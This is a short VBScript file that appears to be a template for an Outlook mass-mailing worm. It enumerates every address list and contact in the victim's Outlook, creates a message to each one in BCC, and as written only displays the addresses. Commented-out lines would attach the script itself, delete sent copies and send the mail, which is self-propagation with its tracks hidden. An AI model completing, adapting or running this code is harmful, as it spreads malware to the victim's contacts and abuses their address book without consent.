   On Error Resume Next

   Dim AAA, BBB, CCC, DDD, EEE

   Set AAA = CreateObject( "Outlook.Application" )
   Set BBB = AAA.GetNameSpace( "MAPI" )

   For Each CCC In BBB.AddressLists
       For DDD = 1 To CCC.AddressEntries.Count
           Set EEE = AAA.CreateItem( 0 )

           EEE.BCC = CCC.AddressEntries( DDD ).Address

   '        if EEE.BCC = "sennaspy@uol.com.bt" then
              MsgBox EEE.BCC
   '        end if

   '       EEE.Subject = "Digite o Subject da mensagem aqui..."
   '       EEE.Body = "Digite o corpo da mensagem aqui..."
   '       EEE.Attachments.Add WScript.ScriptFullName
   '       EEE.DeleteAfterSubmit = True
   '       EEE.Send
       Next
   Next
